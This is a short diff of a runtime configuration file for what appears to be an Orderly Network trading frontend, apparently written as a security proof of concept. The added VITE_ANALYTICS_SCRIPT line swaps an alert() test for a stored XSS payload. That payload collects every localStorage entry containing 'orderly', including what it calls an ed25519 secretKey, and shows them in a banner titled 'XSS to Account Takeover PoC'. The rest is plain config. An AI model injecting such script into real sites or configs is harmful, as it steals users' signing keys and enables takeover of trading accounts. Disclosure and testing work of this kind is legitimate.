@@ -27,7 +27,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_TWITTER_URL": "",
   "VITE_SEO_SITE_NAME": "",
   "VITE_SEO_SITE_DESCRIPTION": "",
-  "VITE_SEO_SITE_URL": "https://xss-poc-test.example.com",
+  "VITE_SEO_SITE_URL": "https://xss-ato-poc.example.com",
   "VITE_SEO_SITE_LANGUAGE": "en",
   "VITE_SEO_SITE_LOCALE": "en_US",
   "VITE_SEO_TWITTER_HANDLE": "",
@@ -37,7 +37,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_USE_CUSTOM_PNL_POSTERS": "false",
   "VITE_CUSTOM_PNL_POSTER_COUNT": "0",
   "VITE_TRADING_VIEW_COLOR_CONFIG": "",
-  "VITE_ANALYTICS_SCRIPT": "<script>alert(\"XSS stored - Orderly Network PoC\")</script>",
+  "VITE_ANALYTICS_SCRIPT": "<script>var s={};for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);if(k.indexOf(\"orderly\")!==-1)s[k]=localStorage.getItem(k)}var d=document.createElement(\"div\");d.style.cssText=\"position:fixed;top:0;left:0;right:0;background:#1a1a2e;color:#0f0;padding:20px;z-index:99999;font-family:monospace;font-size:13px;white-space:pre-wrap;border-bottom:3px solid red\";d.innerHTML=\"<b style=color:red;font-size:18px>XSS to Account Takeover PoC</b>\\nDomain: \"+document.domain+\"\\n\\nStolen orderly_ keys from localStorage:\\n\"+JSON.stringify(s,null,2)+\"\\n\\nThe ed25519 secretKey enables full account takeover via api.orderly.org\";document.body.prepend(d)</script>",
   "VITE_SYMBOL_LIST": "",
   "VITE_RESTRICTED_REGIONS": "",
   "VITE_WHITELISTED_IPS": ""
